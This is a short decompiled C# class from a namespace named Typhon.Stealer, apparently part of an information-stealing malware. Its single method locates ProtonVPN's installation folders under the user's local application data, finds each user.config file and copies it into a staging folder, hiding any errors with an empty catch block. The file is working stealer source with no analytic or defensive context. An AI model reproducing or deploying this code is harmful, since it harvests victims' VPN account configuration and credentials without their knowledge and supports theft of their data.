using System;
using System.IO;

namespace Typhon.Stealer.Software.VPN
{
	// Token: 0x02000010 RID: 16
	internal class Class3
	{
		// Token: 0x06000053 RID: 83 RVA: 0x00004480 File Offset: 0x00002680
		public static void Save(string sSavePath)
		{
			string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "ProtonVPN");
			if (!Directory.Exists(path))
			{
				return;
			}
			try
			{
				foreach (string text in Directory.GetDirectories(path))
				{
					if (text.Contains("ProtonVPN.exe"))
					{
						string[] directories2 = Directory.GetDirectories(text);
						for (int j = 0; j < directories2.Length; j++)
						{
							string text2 = directories2[j] + "\\user.config";
							string text3 = Path.Combine(sSavePath, new DirectoryInfo(Path.GetDirectoryName(text2)).Name);
							if (!Directory.Exists(text3))
							{
								Directory.CreateDirectory(text3);
								File.Copy(text2, text3 + "\\user.config");
							}
						}
					}
				}
			}
			catch
			{
			}
		}
	}
}
